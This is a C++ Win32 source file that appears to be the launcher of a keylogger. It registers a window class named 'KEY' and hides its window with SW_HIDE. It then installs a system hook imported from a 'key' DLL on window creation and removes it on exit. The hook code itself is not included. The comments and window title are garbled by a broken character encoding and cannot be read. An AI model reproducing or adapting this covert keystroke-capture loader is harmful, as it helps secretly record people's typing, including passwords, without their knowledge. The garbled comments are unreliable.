#include <windows.h>

// ��ں��� Winmain

// HINSTANCE :Ӧ�ó���ʵ�����leixing
// LPSTR: char*

//��װ����
extern "C" __declspec(dllimport) BOOL InstallHook();

// ж�ع���
extern "C" __declspec(dllimport) BOOL UninstallHook();

#pragma comment(lib, "key.lib")

// ���ڴ�����
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstace, LPSTR lpCmdLine, int  nCmdShow)
{
	// ��������
	TCHAR szAppClassName[] = TEXT("KEY");
	WNDCLASS wc = { 0 };
	wc.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH); //���ذ�ɫ��ˢ
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);	//���ع��
	wc.hInstance = hInstance;
	wc.lpfnWndProc = WindowProc;	//���ڴ����� 
	wc.lpszClassName = szAppClassName;	// ����������
	wc.style = CS_HREDRAW | CS_VREDRAW; //	������ķ��

	// ע�ᴰ��
	RegisterClass(&wc);

	
	// ��������
	HWND hWnd = CreateWindow(
		szAppClassName,	// ����������
		TEXT("���̼�¼��"),	// ���ڱ���
		WS_OVERLAPPEDWINDOW,	// ���ڵķ��
		400, 200,	// �������Ͻ�
		200, 200,	// ���ڵĿ�͸�
		NULL,	// �����ھ��
		NULL,	// �˵����
		hInstance,	// Ӧ�ó���ʵ�����
		NULL	// ����
		);

	// ��ʾ����
	//ShowWindow(hWnd, SW_SHOW);
	ShowWindow(hWnd, SW_HIDE);	// ���ش���

	// ���´���
	UpdateWindow(hWnd);

	// ��Ϣѭ��
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		// ��������Ϣת��Ϊ�ַ���Ϣ
		TranslateMessage(&msg);
		// ����Ϣ�ַ������ڴ�����
		DispatchMessage(&msg);
	}
	return 0;
}

// ���ڴ�����
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	//return 1; �������а�����Σ�ղ���
	switch (uMsg)
	{
	case WM_CREATE:	// ��װ����
		InstallHook();
		break;
	case WM_CLOSE:	// ���ڹر���Ϣ
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY: // ����������Ϣ
		UninstallHook();
		PostQuitMessage(0);
		break;
	}
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}